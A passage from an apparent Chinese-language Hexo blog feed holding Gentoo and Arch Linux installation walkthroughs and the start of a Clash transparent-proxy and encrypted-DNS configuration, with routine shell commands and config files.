class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> /mnt/gentoo /bin/bash<br><span class="hljs-built_in">source</span> /etc/profile<br><span class="hljs-built_in">export</span> PS1=<span class="hljs-string">&quot;(chroot)<span class="hljs-variable">$&#123;PS1&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><h3 id="5-3-配置portage包管理器源"><a href="#5-3-配置portage包管理器源" class="headerlink" title="5.3.配置portage包管理器源"></a>5.3.配置portage包管理器源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">nano /mnt/gentoo/etc/portage/make.conf<br><br><span class="hljs-comment"># These settings were set by the catalyst build script that automatically</span><br><span class="hljs-comment"># built this stage.</span><br><span class="hljs-comment"># Please consult /usr/share/portage/config/make.conf.example for a more</span><br><span class="hljs-comment"># detailed example.</span><br>COMMON_FLAGS=<span class="hljs-string">&quot;-march=native -O3 -pipe -fstack-protector-strong&quot;</span> <span class="hljs-comment">#设置编译参数(-march-native可以根据cpu指令集进行优化,-O3优化级别)</span><br><br>CFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>    <span class="hljs-comment">#C编译参数</span><br><br>CXXFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>  <span class="hljs-comment">#C++编译参数</span><br><br>FCFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>ACCEPT_KEYWORDS=<span class="hljs-string">&quot;amd64&quot;</span>  <span class="hljs-comment">#可接受的软件包等级(稳定与不稳定)(这里为全局keyworkds,若想为特定软件包指定特定的Keyworkds(可以在/etc/protage/portage.accpet_keywords</span><br><br>ACCEPT_LICENSE=<span class="hljs-string">&quot;*&quot;</span>      <span class="hljs-comment">#可接受的软件包许可证</span><br>MAKEOPTS=<span class="hljs-string">&quot;-j8 -l7.2&quot;</span>    <span class="hljs-comment">#根据cpu核心数来配置(一般配置为cpu核心数+1)</span><br><br>CHOST=<span class="hljs-string">&quot;x86_64-pc-linux-gnu&quot;</span><br>EMERGE_DEFAULT_OPTS=<span class="hljs-string">&quot;--jobs=8 --load-average=7.2 --ask --keep-going --with-bdeps=y&quot;</span><br>GRUB_PLATFORMS=<span class="hljs-string">&quot;efi-64&quot;</span> <span class="hljs-comment">#配置GRUB架构平台</span><br><br>L10N=<span class="hljs-string">&quot;en-US en&quot;</span><br>LINGUAS=<span class="hljs-string">&quot;en-US en&quot;</span><br><br><span class="hljs-comment">#镜像源</span><br>NETEASE=<span class="hljs-string">&quot;https://mirrors.163.com/gentoo/&quot;</span><br>NEUSOFT=<span class="hljs-string">&quot;https://mirrors.neusoft.edu.cn/gentoo/&quot;</span><br>TSINGHUA=<span class="hljs-string">&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo/&quot;</span><br>CDS=<span class="hljs-string">&quot;http://mirrors.yun-idc.com/gentoo/&quot;</span><br>ALI=<span class="hljs-string">&quot;https://mirrors.aliyun.com/gentoo/&quot;</span><br>BIT=<span class="hljs-string">&quot;https://mirror.bit.edu.cn/gentoo/&quot;</span><br>USTC=<span class="hljs-string">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span><br><br><br><span class="hljs-comment">#设置语言</span><br>AUTO_CLEAN=<span class="hljs-string">&quot;yes&quot;</span><br><span class="hljs-comment">#设置自动清理</span><br>VIDEO_CARDS=<span class="hljs-string">&quot;intel iris nvidia&quot;</span><span class="hljs-comment">#配置显卡驱动</span><br>INPUT_DEVICES=<span class="hljs-string">&quot;libinput&quot;</span>            <span class="hljs-comment">#配置输入设备的基本库</span><br><span class="hljs-comment">#将microcode直接编译进内核</span><br>MICROCODE_SIGNATURES=<span class="hljs-string">&quot;-S&quot;</span><br>LC_MESSAGES=C<br><br><br>PORTDIR=<span class="hljs-string">&quot;/var/db/repos/gentoo&quot;</span>      <span class="hljs-comment">#软件包的ebuild文件存储目录</span><br>DISTDIR=<span class="hljs-string">&quot;/var/cache/distfiles&quot;</span><br>PKGDIR=<span class="hljs-string">&quot;/var/cache/binpkgs&quot;</span>         <span class="hljs-comment">#软件包的存储目录</span><br><span class="hljs-comment">#设置软件包缓存目录</span><br>PORTAGE_TMPDIR=<span class="hljs-string">&quot;/tmp&quot;</span>               <span class="hljs-comment">#portage的编译目录</span><br><span class="hljs-comment">#设置portage构建软件包目录(如果内存较大,建议设置在内存里面)</span><br><span class="hljs-comment"># This sets the language of build output to English.</span><br><span class="hljs-comment"># Please keep this setting intact when reporting bugs.</span><br>LC_MESSAGES=C<br>GENTOO_MIRRORS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;USTC&#125;</span>&quot;</span>            <span class="hljs-comment">#配置Gentoo镜像源</span><br>USE=<span class="hljs-string">&quot;-X -qt5 &quot;</span><br></code></pre></td></tr></table></figure><h3 id="5-4-配置软件USE-可选"><a href="#5-4-配置软件USE-可选" class="headerlink" title="5.4.配置软件USE(可选)"></a>5.4.配置软件USE(可选)</h3><p>1.全局USE(make.conf)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">USE=<span class="hljs-string">&quot;-X -qt5 -gnome -kde&quot;</span><span class="hljs-comment">#取消图形化支持</span><br></code></pre></td></tr></table></figure><p>2.软件USE(&#x2F;etc&#x2F;portage&#x2F;package.use&#x2F;*)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-devel/gcc cet pgo go lto nptl -objc -objc++ -objc-gc -fixed-point -d<br>sys-devel/gdb cet lzma multitarget python server source-highlight xml xxhash<br>sys-devel/clang static-analyzer<br>dev-lang/python -bluetooth -wininst<br>net-analyze/nmap nse nping ncat libssh2<br>app-containers/docker btrfs cli apparmor aufs container-init device-mapper overlay<br>app-editors/vim cscope racket -X -crypt  -terminal<br>net-misc/wget cookie-check<br>net-wireless/wpa_supplicant ap -broadcom-sta -crda eap-sim -eapol-test -mesh -p2p<br>openjdk -headless-awt<br>git blksha1 -cgi -highlight -webdav -mediawiki -mediawiki-experimental -perforce subversion -tk<br>openssh X509 hpn ldns livecd scp ssl xmss security-key<br></code></pre></td></tr></table></figure><h3 id="5-5-配置仓库地址"><a href="#5-5-配置仓库地址" class="headerlink" title="5.5.配置仓库地址"></a>5.5.配置仓库地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> --parents /mnt/gentoo/etc/portage/repos.conf<br><br><span class="hljs-built_in">cp</span> /mnt/gentoo/usr/share/portage/config/repos.conf /mnt/gentoo/etc/portage/repos.conf/gentoo.conf<br><br>nano /mnt/gentoo/etc/portage/repos.conf/gentoo.conf<br><br>sync-uri = rsync://mirrors.ustc.edu.cn/gentoo-portage<br></code></pre></td></tr></table></figure><h2 id="6-基本系统配置"><a href="#6-基本系统配置" class="headerlink" title="6.基本系统配置"></a>6.基本系统配置</h2><h3 id="6-1-获取ebuild"><a href="#6-1-获取ebuild" class="headerlink" title="6.1.获取ebuild"></a>6.1.获取ebuild</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取ebuild快照</span><br>emerge-webrsync<br><span class="hljs-comment">#列出系统配置profile</span><br>eselect profile list<br>eselect profile <span class="hljs-built_in">set</span> ?<br></code></pre></td></tr></table></figure><h3 id="6-2配置内核"><a href="#6-2配置内核" class="headerlink" title="6.2配置内核"></a>6.2配置内核</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取内核源码</span><br>emerge --ask sys-kernel/gentoo-sources sys-kernel/dracut sys-apps/pciutils<br><br><span class="hljs-comment">#sys-kernel/gentoo-sources 为内核源码</span><br><span class="hljs-comment">#sys-kernel/dracut用与生成initramfs</span><br><span class="hljs-comment">#sys-apps/pciutils软件包用于收集硬件信息(一些pci设备)</span><br><br><span class="hljs-comment">#列出当前可用内核</span><br>eselect kernel list<br><br><span class="hljs-comment">#设置使用那个内核</span><br>eselect kernel <span class="hljs-built_in">set</span><br><br><span class="hljs-comment">#编译内核</span><br><span class="hljs-comment">#进入内核目录</span><br><span class="hljs-built_in">cd</span> /usr/src/linux<br><br><span class="hljs-comment">#开始编译</span><br><br><span class="hljs-comment">#配置编译选项</span><br>make menuconfig<br><br><span class="hljs-comment">#开始编译</span><br>make -j8 &amp;&amp; make modules_install -j8<br><br><span class="hljs-comment">#安装内核</span><br>make install <br><br><span class="hljs-comment">#生成一个initramfs</span><br>dracut --kver=4.9.16-gentoo<br><span class="hljs-comment">#记得打开frame_buffer(大坑)。</span><br></code></pre></td></tr></table></figure><h3 id="5-5-更新基本系统"><a href="#5-5-更新基本系统" class="headerlink" title="5.5.更新基本系统"></a>5.5.更新基本系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#更新系统</span><br>emerge --ask --verbose --update --deep --newuse @world<br><br><span class="hljs-comment">#常用的软件配置</span><br>emerge --ask sys-kernel/linux-firmware sys-firmware/intel-microcode net-wireless/iw net-wireless/wpa_supplicant  net-misc/dhcp net-misc/dnsmasq app-admin/sysklogd sys-boot/grub:2 app-editors/vim<br><span class="hljs-comment">#sys-kernel/linux-firmware      包含了一些常用的驱动</span><br><span class="hljs-comment">#sys-firmware/intel-microcode   用于更新microcode,以保持系统的稳定性</span><br><span class="hljs-comment">#net-wireeless/iw               一个网络管理工具</span><br><span class="hljs-comment">#net-wireless/wpa-supplicant    wifi连接工具</span><br><span class="hljs-comment">#net-misc/networkmanager        网络管理工具</span><br><span class="hljs-comment">#net-misc/dhcp                  dhcp客户端</span><br><span class="hljs-comment">#net-misc/dnsmasq               dns服务器以及dhcp服务器</span><br><span class="hljs-comment">#app-admin/sysklogd             日志分析工具</span><br><span class="hljs-comment">#sys-boot/grub:2                grub(一种bootloader)</span><br><span class="hljs-comment">#app-editors/vim vim编辑器</span><br></code></pre></td></tr></table></figure><h3 id="5-6-配置系统时区以及系统引导"><a href="#5-6-配置系统时区以及系统引导" class="headerlink" title="5.6.配置系统时区以及系统引导"></a>5.6.配置系统时区以及系统引导</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#生成fstab文件</span><br>blkid<br><span class="hljs-comment">#如果使用的archlinux的livecd,可以使用archlinux的genfstab自动生成fstab文件</span><br><span class="hljs-comment">#genfstab /mnt/gentoo &gt; /mnt/gentoo/etc/fstab</span><br><br><span class="hljs-comment">#建议使用uuid</span><br>blkid &gt;&gt; /etc/fstab<br>修改/etc/fstab文件<br>UUID=<span class="hljs-string">&quot;203C-2BDD&quot;</span>        /boot   vfat    defaults 0 1<br>UUID=<span class="hljs-string">&quot;5afdfbc9-0c66-4a13-8f29-da00199af5de&quot;</span> /   ext4 defaults defaults,noatime,discard 0 2<br><br><span class="hljs-comment">#设置hostname</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Gentoo&quot;</span> &gt; /etc/hostname<br>nano /etc/hosts<br><br><span class="hljs-comment">#定义的是现在系统</span><br>127.0.0.1       tux.homenetwork tux localhost<br>::1             tux.homenetwork tux localhost<br><br><span class="hljs-comment">#定义你网络上的其它系统</span><br>192.168.0.5   jenny.homenetwork jenny<br>192.168.0.6   benny.homenetwork benny<br><br><span class="hljs-comment">#设置时区</span><br><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br>nano /etc/locale.gen<br><br>en_US.UTF-8 UTF-8<br>zh_CN.UTF-8 UTF-8<br><br>locale-gen<br><br><span class="hljs-comment">#自动设置区域</span><br><span class="hljs-comment">#列出可选择的区域</span><br>eselect locale list<br><br><span class="hljs-comment">#设置系统的区域</span><br>eselect locale <span class="hljs-built_in">set</span> ?<br><span class="hljs-comment">#手动设置区域</span><br>nano /etc/locale.conf<br>LANG=<span class="hljs-string">&quot;en_US.UTF-8&quot;</span><br><span class="hljs-comment">#安装系统引导</span><br>grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo<br><br><span class="hljs-comment">#生成grub配置文件</span><br><span class="hljs-built_in">mkdir</span> /boot/grub<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="6-完成安装"><a href="#6-完成安装" class="headerlink" title="6.完成安装"></a>6.完成安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#设置root用户的密码</span><br>passwd root<br></code></pre></td></tr></table></figure><h3 id="7-图形化安装-基于Gnome桌面环境"><a href="#7-图形化安装-基于Gnome桌面环境" class="headerlink" title="7.图形化安装(基于Gnome桌面环境)"></a>7.图形化安装(基于Gnome桌面环境)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">emerge --ask gnome/base<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux发行版安装与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux安装步骤</title>
    <link href="/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Archlinux安装步骤"><a href="#Archlinux安装步骤" class="headerlink" title="Archlinux安装步骤"></a>Archlinux安装步骤</h1><h2 id="1-获取镜像-制作启动盘"><a href="#1-获取镜像-制作启动盘" class="headerlink" title="1.获取镜像,制作启动盘"></a>1.获取镜像,制作启动盘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://mirrors.ustc.edu.cn/archlinux/iso/2022.03.01/archlinux-2022.03.01-x86_64.iso<br><span class="hljs-comment">#linux下面可以使用dd进行刻录</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span> ./archlinux.iso of=/dev/sda<br><span class="hljs-comment">#windows下可以使用rufus进行刻录</span><br></code></pre></td></tr></table></figure><h3 id="2-基本安装环境配置"><a href="#2-基本安装环境配置" class="headerlink" title="2.基本安装环境配置"></a>2.基本安装环境配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#1.使用以太网,直接dhcpcd获取ip地址即可</span><br>2.使用Wi-Fi<br><span class="hljs-comment">#进入网络配置</span><br>iwctl<br><span class="hljs-comment">#扫面周围的wifi</span><br>station wlan0 scan<br><span class="hljs-comment">#显示扫描到的wifi</span><br>station wlan0 get-networks<br><span class="hljs-comment">#连接指定的Wi-Fi</span><br>station wlan0 connect SSID<br><br><br><span class="hljs-comment">#启动时间服务</span><br>timedatectl set-ntp <span class="hljs-literal">true</span><br><span class="hljs-comment">#同步时间</span><br>hwclock --systohc<br></code></pre></td></tr></table></figure><h2 id="3-磁盘分区和挂载"><a href="#3-磁盘分区和挂载" class="headerlink" title="3.磁盘分区和挂载"></a>3.磁盘分区和挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用fdisk工具进行磁盘分区</span><br>fdisk /dev/sda<br><br><br><span class="hljs-comment">#格式化文件系统</span><br>mkfs.ext4 /dev/sda3     <span class="hljs-comment">#格式化根文件系统分区</span><br>mkfs.swap /dev/sda2     <span class="hljs-comment">#格式化swap分区</span><br>mkfs.vfat /dev/sda1     <span class="hljs-comment">#格式化boot文件系统分区</span><br><br><span class="hljs-comment">#分区挂载</span><br>mount /dev/sda3 /mnt<br><span class="hljs-built_in">mkdir</span> /mnt/boot<br>mount /dev/sda1 /mnt/boot<br>swapon /dev/sda2<br></code></pre></td></tr></table></figure><h2 id="4-安装基础系统"><a href="#4-安装基础系统" class="headerlink" title="4.安装基础系统"></a>4.安装基础系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacstrap /mnt base linux linux-firmware<br><span class="hljs-comment">#base为系统基本组件</span><br><span class="hljs-comment">#linux为linux内核</span><br><span class="hljs-comment">#linux-firmware包含了常见的设备驱动</span><br></code></pre></td></tr></table></figure><h2 id="5-进入安装好的系统-进行基本的系统配置"><a href="#5-进入安装好的系统-进行基本的系统配置" class="headerlink" title="5.进入安装好的系统,进行基本的系统配置"></a>5.进入安装好的系统,进行基本的系统配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#生成fstab文件</span><br>genfstab /mnt &gt;&gt; /mnt/etc/fstab<br><br><span class="hljs-comment">#chroot 到新的系统</span><br>arch-chroot /mnt<br></code></pre></td></tr></table></figure><h3 id="5-1-设置hostname和host"><a href="#5-1-设置hostname和host" class="headerlink" title="5.1.设置hostname和host"></a>5.1.设置hostname和host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Arch&quot;</span> &gt; /etc/hostname<br>vim /etc/hosts<br>127.0.0.1   localhost<br>::1         localhost<br>127.0.1.1   archlinux.localdomain<br></code></pre></td></tr></table></figure><h3 id="5-2-设置时间-地区和语言"><a href="#5-2-设置时间-地区和语言" class="headerlink" title="5.2.设置时间,地区和语言"></a>5.2.设置时间,地区和语言</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#设置时区</span><br><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br><br><span class="hljs-comment">#配置语言</span><br>vim /etc/lcoale.gen<br>en_US.UTF-8.UTF-8<br>zh_CN.UTF-8.UTF-8<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;LANG=en_US.UTF-8.UTF-8&quot;</span> &gt; /etc/locale.conf<br>locale-gen<br></code></pre></td></tr></table></figure><h3 id="5-3-安装系统常用的基本软件"><a href="#5-3-安装系统常用的基本软件" class="headerlink" title="5.3.安装系统常用的基本软件"></a>5.3.安装系统常用的基本软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S wpa_supplicant dhcpcd neovim <br><span class="hljs-comment">#wpa_supplicant是wifi连接工具</span><br><span class="hljs-comment">#dhcpcd是获取ip地址的dhcp客户端工具</span><br><span class="hljs-comment">#neovim是一个常用的编辑器</span><br></code></pre></td></tr></table></figure><h2 id="6-安装系统引导"><a href="#6-安装系统引导" class="headerlink" title="6.安装系统引导"></a>6.安装系统引导</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装grub软件包</span><br>pacman -S grub<br><br><span class="hljs-comment">#安装grub</span><br>grub-install --target=x86_64-efi --efi-directory=/boot<br><br><span class="hljs-comment">#生成grub配置文件</span><br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h2 id="7-完成安装"><a href="#7-完成安装" class="headerlink" title="7.完成安装"></a>7.完成安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#设置root用户密码</span><br>passwd root<br><br><span class="hljs-comment">#退出chroot环境</span><br><span class="hljs-built_in">exit</span><br><br><span class="hljs-comment">#卸载磁盘</span><br>umount /mnt/boot<br>umount /mnt<br><br><span class="hljs-comment">#重启系统并移除安装介质</span><br>reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux发行版安装与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/clash%E9%85%8D%E7%BD%AE/"/>
    <url>/1970/01/01/clash%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>title: clash配置<br>date: 2022-05-18 19:19:57<br>tags: 软件配置<br>categories: 软件配置</p><h1 id="clash配置"><a href="#clash配置" class="headerlink" title="clash配置"></a>clash配置</h1><h3 id="1-clash配置透明代理"><a href="#1-clash配置透明代理" class="headerlink" title="1.clash配置透明代理"></a>1.clash配置透明代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -N CLASH_TCP_RULE<br><span class="hljs-comment">#创建新的规则链</span><br>iptables -t nat -A PREROUTING -p tcp -j CLASH_TCP_RULE<br>iptables -t nat -A CLASH -p tcp -d 192.168.0.0/16 -j RETURN<br><span class="hljs-comment">#不对局域网地址进行转发</span><br>iptables -t nat -A CLASH_TCP_RULE -p tcp -j REDIRECT --to-ports 1082(此为clash配置的透明代理端口)<br></code></pre></td></tr></table></figure><h2 id="2-clash配置dns加密代理"><a href="#2-clash配置dns加密代理" class="headerlink" title="2.clash配置dns加密代理"></a>2.clash配置dns加密代理</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">dns:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">listen:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:55</span><br>  <span class="hljs-attr">default-nameserver:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">119.29</span><span class="hljs-number">.29</span><span class="hljs-number">.29</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">223.5</span><span class="hljs-number">.5</span><span class="hljs-number">.5</span><br>  <span class="hljs-attr">nameserver:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://doh.pub/dns-query</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://dns.alidns.com/dns-query</span><br>  <span class="hljs-attr">fallback:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://1.1.1.1/dns-query</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://dns.google.com/dns-query</span><br>  <span class="hljs-attr">fallback-filter:</span><br>    <span class="hljs-attr">geoip:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">geoip-code:</span> <span class="hljs-string">CN</span><br>    <span class="hljs-attr">ipcidr:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">240.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/4</span><br></code></pre></td></tr></table></figure><h2 id="3-配置dns广告过滤以及dns加密"><a href="#3-配置dns广告过滤以及dns加密" class="headerlink" title="3.配置dns广告过滤以及dns加密"></a>3.配置dns广告过滤以及dns加密</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#54端口自行配置AdGuard_Home</span><br>iptables 